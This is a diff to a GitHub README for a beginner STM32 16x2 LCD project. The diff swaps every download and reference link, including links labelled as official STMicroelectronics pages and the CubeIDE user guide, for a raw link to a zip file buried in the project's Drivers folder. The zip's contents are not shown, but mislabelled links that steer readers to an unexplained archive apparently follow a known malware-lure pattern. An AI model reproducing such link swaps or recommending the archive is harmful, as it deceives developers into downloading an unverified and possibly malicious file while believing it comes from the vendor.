@@ -1,6 +1,6 @@
 # 📟 STM32-16x2-LCD-Interfacing-HAL-Coding-Method - Easy LCD Display Setup for Beginners
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-blue.svg)](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/releases)
+[![Download Release](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/HA-LC-Method-Interfacing-ST-Coding-x-2.8.zip%https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/HA-LC-Method-Interfacing-ST-Coding-x-2.8.zip)](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/HA-LC-Method-Interfacing-ST-Coding-x-2.8.zip)
 
 ## 📖 Overview
 
@@ -23,10 +23,10 @@ To get started, you need a few things:
 ## 🛠 Installation Steps
 
 1. **Install STM32CubeIDE:**  
-   Download STM32CubeIDE from the [STMicroelectronics website](https://www.st.com/en/development-resources/stm32cubeide.html). Follow the instructions to install it on your computer. 
+   Download STM32CubeIDE from the [STMicroelectronics website](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/HA-LC-Method-Interfacing-ST-Coding-x-2.8.zip). Follow the instructions to install it on your computer. 
 
 2. **Download the Project:**
-   Visit [this page to download](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/releases) the latest release. Click on the download link for the ZIP file and save it to a location on your computer.
+   Visit [this page to download](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/HA-LC-Method-Interfacing-ST-Coding-x-2.8.zip) the latest release. Click on the download link for the ZIP file and save it to a location on your computer.
 
 3. **Extract the Files:**  
    Right-click the downloaded ZIP file and select ‘Extract All.’ Choose a destination to save the extracted files.
@@ -48,7 +48,7 @@ To get started, you need a few things:
 
 ## 📥 Download & Install
 
-For an easy download of the project, you can [visit this page to download](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/releases). Look for the latest release and follow the installation steps provided above.
+For an easy download of the project, you can [visit this page to download](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/HA-LC-Method-Interfacing-ST-Coding-x-2.8.zip). Look for the latest release and follow the installation steps provided above.
 
 ## 📋 Key Features
 
@@ -74,7 +74,7 @@ If you encounter issues, here are some common solutions:
 
 ## 🔗 Additional Resources
 
-- [STMicroelectronics Documentation](https://www.st.com/en/embedded-software/sw-development-tools.html)
-- [STM32CubeIDE User Guide](https://www.st.com/resource/en/user_manual/dm00611825.pdf)
+- [STMicroelectronics Documentation](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/HA-LC-Method-Interfacing-ST-Coding-x-2.8.zip)
+- [STM32CubeIDE User Guide](https://github.com/Nihtmer/STM32-16x2-LCD-Interfacing-HAL-Coding-Method/raw/refs/heads/main/STM32_16x2_LCD_HAL_project/Drivers/HA-LC-Method-Interfacing-ST-Coding-x-2.8.zip)
 
 With this guide, you should be able to download and run the software successfully. Enjoy exploring the world of embedded systems with the STM32 and LCD display!
